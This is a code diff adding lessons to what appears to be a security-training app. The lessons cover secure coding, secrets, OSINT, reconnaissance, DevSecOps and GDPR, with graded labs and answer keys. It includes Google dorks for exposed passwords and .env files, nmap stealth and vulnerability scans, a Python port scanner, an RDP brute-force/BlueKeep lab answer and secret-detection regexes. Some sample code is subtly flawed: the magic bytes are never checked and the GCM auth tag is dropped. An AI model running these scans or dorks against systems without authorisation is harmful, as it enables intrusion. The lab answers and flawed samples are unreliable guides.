+• HTML context: &lt; for <
+• JavaScript: \\x3c for <
+• URL: %3C for <
+• SQL: Parameterized queries
+
+COMMON MISTAKES:
+• Client-side only validation
+• Trusting hidden form fields
+• Incorrect encoding context
+• Missing null byte checks
+
+FILE UPLOAD SECURITY:
+1. Validate file extension (whitelist)
+2. Check magic bytes (file type)
+3. Rename uploaded files
+4. Store outside web root
+5. Scan for malware
+6. Set proper Content-Type on serve`,
+          codeExample: `// TypeScript: Input Validation Examples
+
+// Email validation
+function validateEmail(email: string): boolean {
+  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/;
+  return emailRegex.test(email) && email.length <= 254;
+}
+
+// Sanitize HTML output (prevent XSS)
+function escapeHtml(unsafe: string): string {
+  return unsafe
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#039;");
+}
+
+// Parameterized query (prevent SQL injection)
+import { createClient } from '@supabase/supabase-js';
+
+async function getUser(userId: string) {
+  const { data, error } = await supabase
+    .from('users')
+    .select('*')
+    .eq('id', userId)  // ✓ Parameterized
+    .single();
+  return data;
+}
+
+// ❌ NEVER DO THIS
+// const query = \`SELECT * FROM users WHERE id = '\${userId}'\`;
+
+// File upload validation
+function validateFileUpload(file: File): { valid: boolean; error?: string } {
+  const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif'];
+  const MAX_SIZE = 5 * 1024 * 1024; // 5MB
+  
+  if (!ALLOWED_TYPES.includes(file.type)) {
+    return { valid: false, error: 'Invalid file type' };
+  }
+  
+  if (file.size > MAX_SIZE) {
+    return { valid: false, error: 'File too large' };
+  }
+  
+  // Check magic bytes
+  const magicBytes: Record<string, number[]> = {
+    'image/jpeg': [0xFF, 0xD8, 0xFF],
+    'image/png': [0x89, 0x50, 0x4E, 0x47],
+    'image/gif': [0x47, 0x49, 0x46]
+  };
+  
+  return { valid: true };
+}`,
+          liveLab: {
+            id: 'lab-input-validation',
+            title: 'Fix the Validation',
+            description: 'Identify and fix input validation flaws',
+            difficulty: 'intermediate',
+            challenge: 'Code: if (!username.includes("<script>")) { saveToDb(username); }. Why is this insecure and what\'s the fix?',
+            hint: 'This is a blacklist approach, and <script> isnt the only way to inject...',
+            solution: 'Blacklist bypass - use whitelist regex like /^[a-zA-Z0-9_]+$/ or encode output',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return (lower.includes('whitelist') || lower.includes('encode') || lower.includes('regex')) &&
+                     (lower.includes('bypass') || lower.includes('blacklist') || lower.includes('other'));
+            },
+            completed: false,
+            points: 75,
+            timeEstimate: '15 min',
+            skills: ['Secure coding', 'Input validation', 'XSS prevention']
+          }
+        },
+        {
+          id: 'secure-2',
+          title: 'Authentication Security',
+          completed: false,
+          keyPoints: [
+            'Password storage best practices',
+            'Multi-factor authentication',
+            'Session management',
+            'OAuth implementation pitfalls'
+          ],
+          content: `AUTHENTICATION SECURITY
+
+PASSWORD STORAGE:
+NEVER store plaintext passwords!
+
+HASHING ALGORITHMS:
+✓ Argon2id (winner of PHC)
+✓ bcrypt (cost factor 12+)
+✓ scrypt
+✗ SHA-256 alone (too fast)
+✗ MD5 (broken)
+
+PASSWORD POLICY:
+• Minimum 12 characters
+• Check against breached lists (HaveIBeenPwned)
+• No composition rules (they hurt security)
+• Enable passphrase support
+
+SESSION SECURITY:
+• Regenerate ID after login
+• HttpOnly + Secure cookie flags
+• Short expiration for sensitive apps
+• Bind to client (IP, user-agent)
+
+MFA IMPLEMENTATION:
+• TOTP (Google Authenticator)
+• WebAuthn/FIDO2 (hardware keys)
+• SMS as backup only
+• Recovery codes (hashed!)
+
+COMMON MISTAKES:
+• Timing attacks in comparison
+• Verbose error messages
+• Missing brute-force protection
+• Insecure password reset`,
+          codeExample: `// Secure Password Handling
+
+// Password hashing with bcrypt
+import bcrypt from 'bcrypt';
+
+const SALT_ROUNDS = 12;
+
+async function hashPassword(password: string): Promise<string> {
+  // Validate password strength first
+  if (password.length < 12) {
+    throw new Error('Password must be at least 12 characters');
+  }
+  
+  return bcrypt.hash(password, SALT_ROUNDS);
+}
+
+async function verifyPassword(password: string, hash: string): Promise<boolean> {
+  // bcrypt.compare is timing-safe
+  return bcrypt.compare(password, hash);
+}
+
+// Secure session management
+interface Session {
+  id: string;
+  userId: string;
+  createdAt: Date;
+  expiresAt: Date;
+  ipAddress: string;
+  userAgent: string;
+}
+
+function createSession(userId: string, req: Request): Session {
+  const now = new Date();
+  const expires = new Date(now.getTime() + 30 * 60 * 1000); // 30 min
+  
+  return {
+    id: crypto.randomUUID(),
+    userId,
+    createdAt: now,
+    expiresAt: expires,
+    ipAddress: req.headers.get('x-forwarded-for') || 'unknown',
+    userAgent: req.headers.get('user-agent') || 'unknown'
+  };
+}
+
+// Rate limiting for login
+const loginAttempts = new Map<string, { count: number; lockedUntil?: Date }>();
+
+function checkRateLimit(identifier: string): boolean {
+  const record = loginAttempts.get(identifier);
+  
+  if (record?.lockedUntil && record.lockedUntil > new Date()) {
+    return false; // Still locked
+  }
+  
+  return true;
+}
+
+function recordFailedAttempt(identifier: string) {
+  const record = loginAttempts.get(identifier) || { count: 0 };
+  record.count++;
+  
+  if (record.count >= 5) {
+    // Lock for 15 minutes after 5 failures
+    record.lockedUntil = new Date(Date.now() + 15 * 60 * 1000);
+  }
+  
+  loginAttempts.set(identifier, record);
+}`,
+          liveLab: {
+            id: 'lab-auth-security',
+            title: 'Authentication Flaw',
+            description: 'Identify authentication vulnerabilities',
+            difficulty: 'intermediate',
+            challenge: 'Login response shows: "Invalid password for user admin@corp.com". What information disclosure issue exists and how would you fix it?',
+            hint: 'The error message confirms whether the username exists...',
+            solution: 'Username enumeration - use generic message like "Invalid credentials" for both invalid user and password',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return (lower.includes('enumerat') || lower.includes('confirm') || lower.includes('exist')) &&
+                     (lower.includes('generic') || lower.includes('same') || lower.includes('invalid credential'));
+            },
+            completed: false,
+            points: 75,
+            timeEstimate: '15 min',
+            skills: ['Authentication', 'Information disclosure', 'Secure coding']
+          }
+        },
+        {
+          id: 'secure-3',
+          title: 'Secrets Management',
+          completed: false,
+          keyPoints: [
+            'Environment variables vs vaults',
+            'API key rotation',
+            'Secrets in CI/CD',
+            'Detecting leaked secrets'
+          ],
+          content: `SECRETS MANAGEMENT
+
+WHAT ARE SECRETS?
+• API keys
+• Database credentials
+• Encryption keys
+• OAuth tokens
+• Private certificates
+
+NEVER DO:
+✗ Hardcode in source code
+✗ Commit to git
+✗ Log secrets
+✗ Share via email/Slack
+✗ Store in plaintext files
+
+BEST PRACTICES:
+
+1. ENVIRONMENT VARIABLES
+   • 12-factor app methodology
+   • Different per environment
+   • Not in version control
+
+2. SECRETS MANAGERS
+   • HashiCorp Vault
+   • AWS Secrets Manager
+   • Azure Key Vault
+   • Google Secret Manager
+
+3. ROTATION
+   • Automate key rotation
+   • Short-lived tokens
+   • Invalidate on suspected leak
+
+4. CI/CD SECRETS
+   • Use platform's secret storage
+   • Never echo secrets
+   • Mask in logs
+
+DETECTION:
+• git-secrets (pre-commit)
+• truffleHog (history scan)
+• GitHub secret scanning
+• Gitleaks`,
+          codeExample: `// Secrets Management Examples
+
+// ❌ NEVER DO THIS
+const API_KEY = "sk_live_abc123..."; // Hardcoded
+
+// ✓ Use environment variables
+const API_KEY = process.env.API_KEY;
+if (!API_KEY) {
+  throw new Error('API_KEY environment variable required');
+}
+
+// TypeScript: Validate required env vars at startup
+interface EnvConfig {
+  DATABASE_URL: string;
+  API_KEY: string;
+  JWT_SECRET: string;
+}
+
+function loadConfig(): EnvConfig {
+  const required = ['DATABASE_URL', 'API_KEY', 'JWT_SECRET'];
+  const missing = required.filter(key => !process.env[key]);
+  
+  if (missing.length > 0) {
+    throw new Error(\`Missing env vars: \${missing.join(', ')}\`);
+  }
+  
+  return {
+    DATABASE_URL: process.env.DATABASE_URL!,
+    API_KEY: process.env.API_KEY!,
+    JWT_SECRET: process.env.JWT_SECRET!
+  };
+}
+
+// Pre-commit hook to prevent secret commits
+// .pre-commit-config.yaml
+/*
+repos:
+  - repo: https://github.com/awslabs/git-secrets
+    hooks:
+      - id: git-secrets
+*/
+
+// Gitleaks configuration (.gitleaks.toml)
+/*
+[rules]
+  description = "AWS Access Key"
+  regex = '''AKIA[0-9A-Z]{16}'''
+  
+  description = "Generic API Key"
+  regex = '''(?i)api[_-]?key.*['\"][a-zA-Z0-9]{20,}['\"]'''
+*/
+
+// Runtime secret masking in logs
+function maskSecrets(message: string, secrets: string[]): string {
+  let masked = message;
+  for (const secret of secrets) {
+    masked = masked.replace(new RegExp(secret, 'g'), '***REDACTED***');
+  }
+  return masked;
+}`,
+          liveLab: {
+            id: 'lab-secrets',
+            title: 'Find the Secret Leak',
+            description: 'Identify secret exposure',
+            difficulty: 'beginner',
+            challenge: 'console.log("Connecting with API key: " + apiKey). Even if apiKey is from env vars, what\'s wrong with this code?',
+            hint: 'Think about where console.log output ends up...',
+            solution: 'Secret is logged - will appear in log files, monitoring systems, and could be exposed. Never log secrets.',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return (lower.includes('log') || lower.includes('print') || lower.includes('output')) &&
+                     (lower.includes('expos') || lower.includes('leak') || lower.includes('never'));
+            },
+            completed: false,
+            points: 50,
+            timeEstimate: '10 min',
+            skills: ['Secrets management', 'Logging security', 'Secure coding']
+          }
+        }
+      ]
+    },
+    // ============ NEW: OSINT & RECONNAISSANCE ============
+    {
+      id: 'osint',
+      title: 'OSINT & Reconnaissance',
+      description: 'Open source intelligence gathering, passive and active reconnaissance',
+      icon: Search,
+      color: 'text-amber-500',
+      bgGradient: 'from-amber-500/20 to-orange-500/20',
+      completed: false,
+      category: 'offensive',
+      estimatedTime: '5 hours',
+      lessons: [
+        {
+          id: 'osint-1',
+          title: 'Passive Reconnaissance',
+          completed: false,
+          keyPoints: [
+            'Search engine dorking',
+            'DNS and WHOIS enumeration',
+            'Social media intelligence',
+            'Document metadata extraction'
+          ],
+          content: `PASSIVE RECONNAISSANCE
+
+Gather information WITHOUT touching target directly!
+
+SEARCH ENGINE DORKING:
+Google operators:
+• site:target.com
+• filetype:pdf site:target.com
+• inurl:admin site:target.com
+• intitle:"index of" site:target.com
+• "password" filetype:txt site:target.com
+
+DNS ENUMERATION:
+• Subdomain discovery
+• MX, TXT, NS records
+• Zone transfers (if misconfigured)
+• Historical DNS (SecurityTrails)
+
+WHOIS INFORMATION:
+• Registrant contact
+• Name servers
+• Registration dates
+• Historical data
+
+SOCIAL MEDIA:
+• Employee profiles (LinkedIn)
+• Technology stack (job postings)
+• Company structure
+• Email formats
+
+DOCUMENT METADATA:
+• Author names
+• Software versions
+• Internal paths
+• Email addresses
+
+TOOLS:
+• theHarvester
+• Maltego
+• Shodan
+• Censys
+• SpiderFoot`,
+          codeExample: `# Passive Recon Commands
+
+# theHarvester - gather emails, subdomains
+theHarvester -d target.com -b all -l 500
+
+# DNS enumeration
+dig ANY target.com
+dig +short MX target.com
+dig +short TXT target.com
+
+# Subdomain brute force (passive sources)
+amass enum -passive -d target.com
+
+# WHOIS lookup
+whois target.com
+
+# Certificate transparency logs
+curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value'
+
+# Shodan search
+shodan search "hostname:target.com"
+shodan host 192.168.1.1
+
+# Google dork automation
+# ghdb.py - Google Hacking Database
+inurl:wp-admin site:target.com
+filetype:sql site:target.com
+filetype:env site:target.com
+
+# Extract metadata from documents
+exiftool document.pdf
+# Look for: Author, Creator, Producer, GPS
+
+# Python: Automated OSINT
+import requests
+from bs4 import BeautifulSoup
+
+def harvest_emails(domain):
+    """Find emails from search results"""
+    emails = set()
+    
+    # Search via DuckDuckGo (no API needed)
+    query = f"site:{domain} email"
+    url = f"https://html.duckduckgo.com/html/?q={query}"
+    
+    response = requests.get(url)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    
+    # Extract email patterns
+    import re
+    email_pattern = r'[a-zA-Z0-9._%+-]+@' + re.escape(domain)
+    
+    for text in soup.stripped_strings:
+        found = re.findall(email_pattern, text)
+        emails.update(found)
+    
+    return list(emails)`,
+          liveLab: {
+            id: 'lab-osint',
+            title: 'OSINT Challenge',
+            description: 'Construct effective search queries',
+            difficulty: 'beginner',
+            challenge: 'Write a Google dork to find exposed .env files on GitHub for any repository.',
+            hint: 'Think about filename and the site...',
+            solution: 'site:github.com filename:.env or site:github.com ".env" password',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return lower.includes('site:github') && (lower.includes('.env') || lower.includes('filename'));
+            },
+            completed: false,
+            points: 50,
+            timeEstimate: '10 min',
+            skills: ['OSINT', 'Google dorking', 'Reconnaissance']
+          }
+        },
+        {
+          id: 'osint-2',
+          title: 'Active Reconnaissance',
+          completed: false,
+          keyPoints: [
+            'Port scanning techniques',
+            'Service enumeration',
+            'Web technology fingerprinting',
+            'Vulnerability scanning'
+          ],
+          content: `ACTIVE RECONNAISSANCE
+
+Direct interaction with target - may be detected!
+
+PORT SCANNING:
+• TCP Connect scan (reliable, loud)
+• SYN scan (stealthy, requires root)
+• UDP scan (slow, important)
+• Version detection
+
+SERVICE ENUMERATION:
+For each open port:
+• Banner grabbing
+• Version detection
+• Default credentials check
+• Known vulnerabilities
+
+WEB FINGERPRINTING:
+• Server headers
+• Cookies (session frameworks)
+• Error pages
+• robots.txt, sitemap.xml
+• JavaScript libraries
+
+VULNERABILITY SCANNING:
+• Nessus, OpenVAS
+• Nikto (web)
+• Nuclei (templates)
+
+STEALTH CONSIDERATIONS:
+• Slow scan rate
+• Fragment packets
+• Decoy IPs
+• Tor/proxies
+• Timing (after hours)`,
+          codeExample: `# Nmap Scanning Techniques
+
+# Quick scan - top 1000 ports
+nmap -sV -sC target.com
+
+# Full port scan
+nmap -p- --min-rate 1000 target.com
+
+# Stealth SYN scan
+nmap -sS -T2 target.com
+
+# UDP scan (important services)
+nmap -sU --top-ports 100 target.com
+
+# Service version + scripts
+nmap -sV -sC -p 22,80,443 target.com
+
+# Vulnerability scan
+nmap --script vuln target.com
+
+# OS detection
+nmap -O target.com
+
+# Output to all formats
+nmap -sV -sC -oA scan_results target.com
+
+# Web fingerprinting
+whatweb https://target.com
+wappalyzer https://target.com
+
+# Nikto web scan
+nikto -h https://target.com
+
+# Nuclei vulnerability scan
+nuclei -u https://target.com -t cves/
+
+# Directory brute force
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
+
+# Python: Port Scanner
+import socket
+from concurrent.futures import ThreadPoolExecutor
+
+def scan_port(host, port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((host, port))
+        sock.close()
+        
+        if result == 0:
+            return port, 'open'
+    except:
+        pass
+    return port, 'closed'
+
+def port_scan(host, ports):
+    open_ports = []
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        results = executor.map(lambda p: scan_port(host, p), ports)
+        for port, status in results:
+            if status == 'open':
+                open_ports.append(port)
+    return open_ports`,
+          liveLab: {
+            id: 'lab-active-recon',
+            title: 'Nmap Scan Analysis',
+            description: 'Interpret port scan results',
+            difficulty: 'intermediate',
+            challenge: 'Nmap shows port 3389 open with service "ms-wbt-server". What service is this and what attack would you try first?',
+            hint: 'This is a Windows remote access service...',
+            solution: 'RDP (Remote Desktop Protocol) - try credential brute force or check for BlueKeep (CVE-2019-0708)',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return (lower.includes('rdp') || lower.includes('remote desktop')) &&
+                     (lower.includes('brute') || lower.includes('bluekeep') || lower.includes('credential'));
+            },
+            completed: false,
+            points: 75,
+            timeEstimate: '15 min',
+            skills: ['Port scanning', 'Service enumeration', 'Nmap']
+          }
+        }
+      ]
+    },
+    // ============ NEW: SECURITY AUTOMATION ============
+    {
+      id: 'security-automation',
+      title: 'Security Automation & DevSecOps',
+      description: 'Automate security testing, CI/CD security, infrastructure as code',
+      icon: Wrench,
+      color: 'text-violet-500',
+      bgGradient: 'from-violet-500/20 to-purple-500/20',
+      completed: false,
+      category: 'advanced',
+      estimatedTime: '6 hours',
+      lessons: [
+        {
+          id: 'automation-1',
+          title: 'CI/CD Pipeline Security',
+          completed: false,
+          keyPoints: [
+            'SAST integration',
+            'DAST in pipelines',
+            'Dependency scanning',
+            'Container image scanning'
+          ],
+          content: `CI/CD SECURITY (DevSecOps)
+
+SHIFT LEFT SECURITY:
+Find vulnerabilities early in development!
+
+PIPELINE SECURITY STAGES:
+
+1. PRE-COMMIT
+   • Secret scanning (git-secrets)
+   • Linting
+   • IDE security plugins
+
+2. BUILD
+   • SAST (Static Analysis)
+   • Dependency check
+   • License compliance
+
+3. TEST
+   • DAST (Dynamic Analysis)
+   • API security testing
+   • Fuzz testing
+
+4. DEPLOY
+   • Container scanning
+   • IaC security
+   • Compliance checks
+
+5. RUNTIME
+   • RASP
+   • Monitoring
+   • Vulnerability management
+
+TOOLS BY CATEGORY:
+SAST: Semgrep, SonarQube, CodeQL
+DAST: OWASP ZAP, Burp Suite
+SCA: Snyk, Dependabot, OWASP Dependency-Check
+Container: Trivy, Clair, Anchore
+IaC: Checkov, tfsec, Terrascan`,
+          codeExample: `# GitHub Actions Security Pipeline
+name: Security Scan
+
+on: [push, pull_request]
+
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      
+      # Secret scanning
+      - name: Gitleaks
+        uses: gitleaks/gitleaks-action@v2
+      
+      # SAST with Semgrep
+      - name: Semgrep
+        uses: returntocorp/semgrep-action@v1
+        with:
+          config: p/security-audit
+      
+      # Dependency scanning
+      - name: Dependency Check
+        uses: dependency-check/Dependency-Check_Action@main
+        with:
+          project: 'my-project'
+          path: '.'
+          format: 'HTML'
+      
+      # Container scanning
+      - name: Build image
+        run: docker build -t myapp:latest .
+        
+      - name: Trivy scan
+        uses: aquasecurity/trivy-action@master
+        with:
+          image-ref: 'myapp:latest'
+          severity: 'CRITICAL,HIGH'
+          exit-code: '1'
+      
+      # DAST with ZAP
+      - name: OWASP ZAP Scan
+        uses: zaproxy/action-baseline@v0.7.0
+        with:
+          target: 'https://staging.example.com'
+
+# Semgrep custom rule
+rules:
+  - id: hardcoded-secret
+    patterns:
+      - pattern-either:
+        - pattern: $X = "..."
+        - pattern: $X = '...'
+      - metavariable-regex:
+          metavariable: $X
+          regex: (api_key|password|secret|token)
+    message: "Potential hardcoded secret"
+    severity: ERROR`,
+          liveLab: {
+            id: 'lab-cicd-security',
+            title: 'Pipeline Security Design',
+            description: 'Design secure CI/CD pipeline',
+            difficulty: 'intermediate',
+            challenge: 'A developer pushes code with a hardcoded AWS key. At which CI/CD stage should this be caught EARLIEST, and which tool type would detect it?',
+            hint: 'Think about the earliest stage before code even enters the repo...',
+            solution: 'Pre-commit stage with secret scanning tool (git-secrets, gitleaks)',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return (lower.includes('pre-commit') || lower.includes('pre commit') || lower.includes('before commit')) &&
+                     (lower.includes('secret') || lower.includes('gitleaks') || lower.includes('git-secrets'));
+            },
+            completed: false,
+            points: 75,
+            timeEstimate: '15 min',
+            skills: ['DevSecOps', 'CI/CD security', 'Secret scanning']
+          }
+        },
+        {
+          id: 'automation-2',
+          title: 'Infrastructure as Code Security',
+          completed: false,
+          keyPoints: [
+            'Terraform security scanning',
+            'CloudFormation security',
+            'Policy as Code (OPA)',
+            'Drift detection'
+          ],
+          content: `INFRASTRUCTURE AS CODE SECURITY
+
+WHY IaC SECURITY?
+• Misconfiguration = #1 cloud breach cause
+• Scan before deployment
+• Enforce security policies
+• Audit trail
+
+COMMON MISCONFIGURATIONS:
+
+AWS:
+• S3 buckets public
+• Security groups 0.0.0.0/0
+• Unencrypted databases
+• Missing CloudTrail
+
+Azure:
+• Storage accounts public
+• NSG allowing SSH from any
+• Missing diagnostic logs
+
+GCP:
+• Firewall rules too permissive
+• Public BigQuery datasets
+• Missing audit logging
+
+TOOLS:
+• Checkov (multi-cloud)
+• tfsec (Terraform)
+• cfn-lint + cfn_nag (CloudFormation)
+• Terrascan
+• Bridgecrew
+
+POLICY AS CODE:
+• OPA/Rego for custom policies
+• Sentinel (Terraform Enterprise)
+• Kyverno (Kubernetes)`,
+          codeExample: `# tfsec scan for Terraform
+tfsec .
+
+# Checkov multi-framework scan
+checkov -d . --framework terraform,cloudformation
+
+# Example Terraform with security issues
+resource "aws_s3_bucket" "bad_bucket" {
+  bucket = "my-bucket"
+  # ❌ No encryption
+  # ❌ No versioning
+  # ❌ No access logging
+}
+
+# ✓ Secure S3 bucket
+resource "aws_s3_bucket" "secure_bucket" {
+  bucket = "my-secure-bucket"
+}
+
+resource "aws_s3_bucket_server_side_encryption_configuration" "encryption" {
+  bucket = aws_s3_bucket.secure_bucket.id
+  rule {
+    apply_server_side_encryption_by_default {
+      sse_algorithm = "aws:kms"
+    }
+  }
+}
+
+resource "aws_s3_bucket_versioning" "versioning" {
+  bucket = aws_s3_bucket.secure_bucket.id
+  versioning_configuration {
+    status = "Enabled"
+  }
+}
+
+resource "aws_s3_bucket_public_access_block" "block_public" {
+  bucket = aws_s3_bucket.secure_bucket.id
+  block_public_acls       = true
+  block_public_policy     = true
+  ignore_public_acls      = true
+  restrict_public_buckets = true
+}
+
+# OPA/Rego Policy
+package terraform.s3
+
+deny[msg] {
+  resource := input.resource.aws_s3_bucket[name]
+  not resource.server_side_encryption_configuration
+  msg := sprintf("S3 bucket '%s' missing encryption", [name])
+}
+
+deny[msg] {
+  resource := input.resource.aws_security_group[name]
+  ingress := resource.ingress[_]
+  ingress.cidr_blocks[_] == "0.0.0.0/0"
+  ingress.from_port <= 22
+  ingress.to_port >= 22
+  msg := sprintf("Security group '%s' allows SSH from any IP", [name])
+}`,
+          liveLab: {
+            id: 'lab-iac-security',
+            title: 'IaC Vulnerability',
+            description: 'Find infrastructure misconfigurations',
+            difficulty: 'intermediate',
+            challenge: 'Terraform: resource "aws_security_group" "web" { ingress { from_port = 22, to_port = 22, cidr_blocks = ["0.0.0.0/0"] } }. What\'s the security issue?',
+            hint: 'Look at the CIDR block and the port...',
+            solution: 'SSH (port 22) is open to the entire internet (0.0.0.0/0) - should be restricted to specific IPs',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return (lower.includes('ssh') || lower.includes('22')) &&
+                     (lower.includes('internet') || lower.includes('0.0.0.0') || lower.includes('any') || lower.includes('open'));
+            },
+            completed: false,
+            points: 75,
+            timeEstimate: '15 min',
+            skills: ['IaC security', 'Terraform', 'Cloud security']
+          }
+        }
+      ]
+    },
+    // ============ NEW: PRIVACY & COMPLIANCE ============
+    {
+      id: 'privacy-compliance',
+      title: 'Privacy & Compliance',
+      description: 'GDPR, data protection, privacy engineering, compliance frameworks',
+      icon: ShieldCheck,
+      color: 'text-sky-500',
+      bgGradient: 'from-sky-500/20 to-blue-500/20',
+      completed: false,
+      category: 'fundamentals',
+      estimatedTime: '4 hours',
+      lessons: [
+        {
+          id: 'privacy-1',
+          title: 'GDPR & Data Protection',
+          completed: false,
+          keyPoints: [
+            'GDPR key principles',
+            'Lawful basis for processing',
+            'Data subject rights',
+            'Technical measures'
+          ],
+          content: `GDPR & DATA PROTECTION
+
+KEY PRINCIPLES:
+1. Lawfulness, fairness, transparency
+2. Purpose limitation
+3. Data minimization
+4. Accuracy
+5. Storage limitation
+6. Integrity & confidentiality
+7. Accountability
+
+LAWFUL BASIS:
+• Consent (freely given, specific)
+• Contract necessity
+• Legal obligation
+• Vital interests
+• Public task
+• Legitimate interests
+
+DATA SUBJECT RIGHTS:
+• Right to access
+• Right to rectification
+• Right to erasure ("right to be forgotten")
+• Right to restrict processing
+• Right to data portability
+• Right to object
+• Rights related to automated decisions
+
+TECHNICAL MEASURES:
+• Encryption (at rest, in transit)
+• Pseudonymization
+• Access controls
+• Audit logging
+• Data minimization in code
+• Privacy by design`,
+          codeExample: `// Privacy-Focused Implementation
+
+// Data minimization - only collect what's needed
+interface UserRegistration {
+  email: string;
+  password: string;
+  // Don't collect: DOB, address, phone unless needed
+}
+
+// Consent tracking
+interface ConsentRecord {
+  userId: string;
+  consentType: 'marketing' | 'analytics' | 'essential';
+  granted: boolean;
+  timestamp: Date;
+  ipAddress: string;
+  version: string;  // Terms version consented to
+}
+
+// Right to erasure implementation
+async function deleteUserData(userId: string): Promise<void> {
+  // Delete from main tables
+  await supabase.from('users').delete().eq('id', userId);
+  await supabase.from('orders').delete().eq('user_id', userId);
+  await supabase.from('preferences').delete().eq('user_id', userId);
+  
+  // Delete from backups (schedule for next backup rotation)
+  await scheduleBackupDeletion(userId);
+  
+  // Notify third parties
+  await notifyThirdPartyDeletion(userId);
+  
+  // Audit log (anonymized)
+  await logDeletion({ 
+    action: 'user_deletion',
+    timestamp: new Date()
+    // Don't log userId - it's deleted!
+  });
+}
+
+// Pseudonymization
+function pseudonymize(data: string, key: string): string {
+  const hmac = crypto.createHmac('sha256', key);
+  hmac.update(data);
+  return hmac.digest('hex');
+}
+
+// Data portability - export user data
+async function exportUserData(userId: string): Promise<object> {
+  const userData = await supabase
+    .from('users')
+    .select('*')
+    .eq('id', userId)
+    .single();
+    
+  const orders = await supabase
+    .from('orders')
+    .select('*')
+    .eq('user_id', userId);
+  
+  return {
+    exportDate: new Date().toISOString(),
+    format: 'JSON',
+    user: userData.data,
+    orders: orders.data
+  };
+}`,
+          liveLab: {
+            id: 'lab-gdpr',
+            title: 'GDPR Compliance Check',
+            description: 'Identify GDPR requirements',
+            difficulty: 'beginner',
+            challenge: 'A user requests all their data be deleted under GDPR Article 17. What must you ensure is deleted?',
+            hint: 'Think beyond just the main database...',
+            solution: 'All personal data including: database records, backups, logs, third-party systems, analytics, and any derived data',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return (lower.includes('backup') || lower.includes('log') || lower.includes('third party') || lower.includes('all'));
+            },
+            completed: false,
+            points: 50,
+            timeEstimate: '10 min',
+            skills: ['GDPR', 'Data protection', 'Compliance']
+          }
+        },
+        {
+          id: 'privacy-2',
+          title: 'Security Frameworks',
+          completed: false,
+          keyPoints: [
+            'NIST Cybersecurity Framework',
+            'ISO 27001 overview',
+            'SOC 2 requirements',
+            'PCI DSS basics'
+          ],
+          content: `SECURITY COMPLIANCE FRAMEWORKS
+
+NIST CYBERSECURITY FRAMEWORK:
+Five core functions:
+1. IDENTIFY - Asset management, risk assessment
+2. PROTECT - Access control, training, data security
+3. DETECT - Monitoring, detection processes
+4. RESPOND - Response planning, communications
+5. RECOVER - Recovery planning, improvements
+
+ISO 27001:
+• Information Security Management System
+• Risk-based approach
+• 114 controls in Annex A
+• Annual audits required
+
+SOC 2 (Service Organizations):
+Trust Service Criteria:
+• Security (required)
+• Availability
+• Processing Integrity
+• Confidentiality
+• Privacy
+
+PCI DSS (Payment Cards):
+12 Requirements:
+1. Firewall configuration
+2. No vendor defaults
+3. Protect stored data
+4. Encrypt transmission
+5. Anti-virus
+6. Secure systems
+7. Restrict access
+8. Unique IDs
+9. Physical access
+10. Track access
+11. Test security
+12. Security policy`,
+          codeExample: `// Implementing SOC 2 Controls
+
+// 1. Access Control Logging
+interface AccessLog {
+  userId: string;
+  action: string;
+  resource: string;
+  timestamp: Date;
+  ipAddress: string;
+  userAgent: string;
+  success: boolean;
+}
+
+async function logAccess(log: AccessLog): Promise<void> {
+  await supabase.from('access_logs').insert({
+    ...log,
+    created_at: new Date()
+  });
+}
+
+// 2. Encryption at Rest
+// Supabase handles this, but for custom storage:
+import { createCipheriv, randomBytes } from 'crypto';
+
+function encryptData(data: string, key: Buffer): { encrypted: string; iv: string } {
+  const iv = randomBytes(16);
+  const cipher = createCipheriv('aes-256-gcm', key, iv);
+  
+  let encrypted = cipher.update(data, 'utf8', 'hex');
+  encrypted += cipher.final('hex');
+  
+  return {
+    encrypted,
+    iv: iv.toString('hex')
+  };
+}
+
+// 3. Session Management
+const SESSION_CONFIG = {
+  maxAge: 30 * 60 * 1000,  // 30 minutes
+  renewalThreshold: 5 * 60 * 1000,  // Renew if 5 min left
+  absoluteTimeout: 8 * 60 * 60 * 1000,  // 8 hours max
+};
+
+// 4. Change Management Tracking
+interface ChangeRecord {
+  changeId: string;
+  description: string;
+  requestedBy: string;
+  approvedBy: string;
+  implementedBy: string;
+  timestamp: Date;
+  rollbackPlan: string;
+}
+
+// 5. Incident Response
+interface IncidentRecord {
+  id: string;
+  severity: 'low' | 'medium' | 'high' | 'critical';
+  description: string;
+  detectedAt: Date;
+  respondedAt: Date;
+  resolvedAt?: Date;
+  rootCause?: string;
+  lessonsLearned?: string;
+}`
+        }
+      ]
     }
   ]);
 
